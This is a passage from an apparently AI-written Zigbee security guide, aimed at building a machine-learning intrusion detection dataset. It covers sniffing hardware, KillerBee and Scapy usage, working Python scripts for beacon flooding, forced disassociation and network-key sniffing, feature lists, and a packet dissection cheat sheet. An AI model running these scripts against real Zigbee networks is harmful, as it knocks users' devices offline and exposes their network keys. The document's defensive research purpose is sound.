│  • Good for protocol analysis                    │
│  • Discontinued but available used               │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│  nRF52840 Dongle (Nordic)                        │
│  • 802.15.4 capable                              │
│  • Can be programmed for Zigbee                  │
│  • ~$10                                          │
└──────────────────────────────────────────────────┘
```

### **15.2 Software Tools**

#### **KillerBee Framework**
```bash
# Install KillerBee
git clone https://github.com/riverloopsec/killerbee
cd killerbee
sudo python setup.py install

# Scan for Zigbee networks
sudo zbstumbler -i 11:26

# Dump network traffic
sudo zbdump -i 11 -w capture.pcap

# Replay attack
sudo zbreplay -i capture.pcap -d /dev/ttyUSB0

# Packet injection
sudo zbdsniff -f 0x1234 -c 15
```

#### **Zigbee2MQTT (For Testing)**
```bash
# Setup Zigbee gateway
npm install -g zigbee2mqtt

# Configuration
nano /opt/zigbee2mqtt/data/configuration.yaml

# Start
npm start

# Pairing mode
mosquitto_pub -t zigbee2mqtt/bridge/request/permit_join \
  -m '{"value": true}'
```

#### **Wireshark (with Zigbee dissector)**
```bash
# Capture with CC2531
whsniff -c 15 | wireshark -k -i -

# Display filter examples
zbee_nwk                   # All Zigbee NWK frames
zbee_nwk.src == 0x0000     # From coordinator
zbee_aps.cmd.id == 0x01    # Transport Key
zbee_security              # Encrypted frames
```

#### **Scapy-Zigbee**
```python
from scapy.all import *
from scapy.layers.zigbee import *

# Craft Zigbee packet
pkt = Dot15d4()/Dot15d4Data()/ZigbeeNWK()
pkt[ZigbeeNWK].destination = 0x0000  # To coordinator

# Send
sendp(pkt, iface="wpan0")
```

### **15.3 Firmware for CC2531**
```bash
# Flash sniffer firmware
git clone https://github.com/jorisvr/CC2531-Zigbee-Sniffer-Firmware
cd CC2531-Zigbee-Sniffer-Firmware

# Flash using CC Debugger
cc-tool -e -w CC2531ZNP-Pro-Secure_Standard.hex

# Verify
cc-tool -v
```

---

## **16. ATTACK SCRIPT EXAMPLES**

### **16.1 Beacon Flood**
```python
#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.zigbee import *
import time

def beacon_flood(channel=15, interval=0.01):
    """
    Flood Zigbee channel with fake beacon frames
    Similar to WiFi beacon flood
    """
    # Configure radio
    os.system(f"iwpan dev wpan0 set pan_id 0xffff")
    os.system(f"iwpan phy phy0 set channel 0 {channel}")

    fake_pan_id = random.randint(0x0000, 0xFFFE)
    fake_coord = random.randint(0x0000, 0xFFFE)

    while True:
        # Craft beacon frame
        pkt = Dot15d4()/Dot15d4Beacon()
        pkt[Dot15d4].src_panid = fake_pan_id
        pkt[Dot15d4].src_addr = fake_coord
        pkt[Dot15d4Beacon].assoc_permit = True
        pkt[Dot15d4Beacon].router_cap = True
        pkt[Dot15d4Beacon].device_depth = 0

        # Send
        sendp(pkt, iface="wpan0", verbose=False)
        time.sleep(interval)

        # Randomize for next iteration
        fake_pan_id = random.randint(0x0000, 0xFFFE)

if __name__ == "__main__":
    beacon_flood(channel=15, interval=0.01)
```

### **16.2 Dissociation Attack**
```python
#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.zigbee import *

def dissoc_attack(target_addr, coord_addr, pan_id):
    """
    Force device to leave network
    Similar to WiFi deauth
    """
    # Craft Disassociation Notification
    pkt = Dot15d4(
        fcf_frametype=3,  # Command frame
        dest_panid=pan_id,
        dest_addr=target_addr,
        src_panid=pan_id,
        src_addr=coord_addr
    )/Dot15d4Cmd(
        cmd_id=0x03  # Disassociation Notification
    )/Dot15d4CmdDisassociation(
        disassociation_reason=0x02  # Device wishes to leave
    )

    # Send repeatedly
    for i in range(100):
        sendp(pkt, iface="wpan0", verbose=False)
        time.sleep(0.01)

    print(f"[+] Sent 100 disassociation frames to {hex(target_addr)}")

# Example usage
dissoc_attack(
    target_addr=0x3C4F,
    coord_addr=0x0000,
    pan_id=0x1A2B
)
```

### **16.3 Network Key Sniffer**
```python
#!/usr/bin/env python3
from scapy.all import *
from scapy.layers.zigbee import *

def sniff_network_key(interface="wpan0"):
    """
    Capture Transport Key command during device join
    """
    def packet_handler(pkt):
        if ZigbeeAppCommandPayload in pkt:
            # Check for Transport Key command
            if pkt[ZigbeeAppCommandPayload].cmd_identifier == 0x05:
                print("[!] Transport Key detected!")
                print(f"    Network Key: {pkt.show()}")
                # Extract key from packet
                wrpcap("transport_key_captured.pcap", pkt)

    print("[*] Sniffing for Transport Key...")
    sniff(iface=interface, prn=packet_handler, store=False)

if __name__ == "__main__":
    sniff_network_key()
```

---

## **17. DATASET COLLECTION STRATEGY**

For your ML-based IDS, collect these traffic types:

### **17.1 Benign Traffic Patterns**
```
Normal Operations:
├── Device join/leave sequences
├── Periodic sensor reports (temp, humidity)
├── On/Off cluster commands
├── Route discovery (RREQ/RREP)
├── ZDO queries (Active_EP, Simple_Desc)
├── Binding requests
└── Heartbeat/keepalive messages
```

### **17.2 Attack Traffic Patterns**
```
Attack Scenarios:
├── Beacon floods (high packet rate)
├── Dissociation attacks (unexpected leave)
├── Routing manipulation (fake RREQ/RREP)
├── Replay attacks (duplicate frames)
├── Command injection (unauthorized ZCL)
├── Jamming signatures (channel noise)
└── Man-in-the-middle (intercepted keys)
```

### **17.3 Feature Extraction**
```
Per-Packet Features:
- Frame type (Beacon, Data, Command, ACK)
- Source/Dest addresses
- PAN ID
- Sequence number
- Packet length
- Inter-arrival time
- Channel number
- RSSI (signal strength)
- LQI (link quality indicator)

Flow-Based Features:
- Packets per second (PPS)
- Bytes per second (BPS)
- Unique source/dest counts
- Average packet size
- Beacon interval variance
- Routing update frequency
```

---

## **18. ZIGBEE 3.0 IMPROVEMENTS**

Zigbee 3.0 unified all profiles and improved security:

```
┌─────────────────────────────────────────────────┐
│           ZIGBEE 3.0 CHANGES                    │
├─────────────────────────────────────────────────┤
│ ✓ Unified application layer (no more ZHA/ZLL)  │
│ ✓ Install Code mandatory (unique per device)   │
│ ✓ Green Power support (battery-free devices)   │
│ ✓ Better OTA firmware updates                  │
│ ✓ Touchlink commissioning deprecated           │
│ ✓ Stronger default security                    │
└─────────────────────────────────────────────────┘

Install Code Process:
1. Unique 16-byte code printed on device/box
2. User scans QR code or enters manually
3. Code used to derive TCLK
4. Device can only join with correct TCLK
5. No default keys (no "ZigBeeAlliance09"!)
```

---

## **19. QUICK REFERENCE: PACKET DISSECTION CHEAT SHEET**

```
LAYER-BY-LAYER BREAKDOWN:

PHY Layer:
├── Preamble (4 bytes): 00 00 00 00
├── SFD (1 byte): A7
├── Length (1 byte): 1F (31 bytes)
└── PSDU (31 bytes):
    └── MAC Frame...

MAC Frame:
├── Frame Control (2 bytes): 61 88
│   └── Type: Data, Security: Yes, ACK: Yes
├── Sequence (1 byte): 88
├── Dest PAN (2 bytes): 1A 2B
├── Dest Addr (2 bytes): 00 00 (Coordinator)
├── Src Addr (2 bytes): 4F 3C
├── Security Header (14 bytes):
│   ├── Control: 0x05 (NWK Key, MIC-32)
│   ├── Frame Counter: 00 00 01 23
│   └── Source IEEE: 00:12:4B:00:14:5F:2D:01
├── Encrypted Payload (varies):
│   └── [NWK + APS + ZCL encrypted]
└── MIC (4 bytes): A5 3F C2 D1

NWK Frame (after decryption):
├── Frame Control (2 bytes): 01 88
├── Dest Addr (2 bytes): 00 00
├── Src Addr (2 bytes): 4F 3C
├── Radius (1 byte): 0x1E (30 hops max)
├── Sequence (1 byte): 0x42
└── Payload: APS Frame...

APS Frame:
├── Frame Control (1 byte): 0x00 (Data, no security)
├── Dest Endpoint (1 byte): 0x01
├── Cluster ID (2 bytes): 0x0006 (On/Off)
├── Profile ID (2 bytes): 0x0104 (ZHA)
├── Src Endpoint (1 byte): 0x01
├── Counter (1 byte): 0x55
└── Payload: ZCL Command...

ZCL Frame:
├── Frame Control (1 byte): 0x01 (Cluster-specific, client→server)
├── Transaction Seq (1 byte): 0x12
├── Command ID (1 byte): 0x01 (On command)
└── Payload: (empty for On/Off)
```

---

That's the comprehensive Zigbee breakdown!

**Key Takeaways:**
1. **Zigbee = IEEE 802.15.4 (PHY/MAC) + Zigbee (NWK/APS/APL)**
2. **Mesh topology** - self-healing, multi-hop routing
3. **Three device types** - Coordinator (1), Routers (many), End Devices (many)
4. **Two-layer security** - Network Key (broadcast) + Link Key (unicast)
5. **Attack surface** - Join process, routing, default keys, unencrypted commands

**Next Steps:**
- Want comparison with LoRa?
- Need specific attack implementation details?
- Dataset labeling strategy for your ML model?
- CC2531 setup walkthrough?

What's your next focus? 🎯

---

**Related**:
- [[Zigbee/README|Zigbee Home]]
- [[Zigbee/Attacks/01-beacon-flood|Beacon Flood Attack]]
- [[Zigbee/Tools/01-killerbee-guide|KillerBee Guide]]
- [[README|Home]] • [[INDEX|Full Index]]
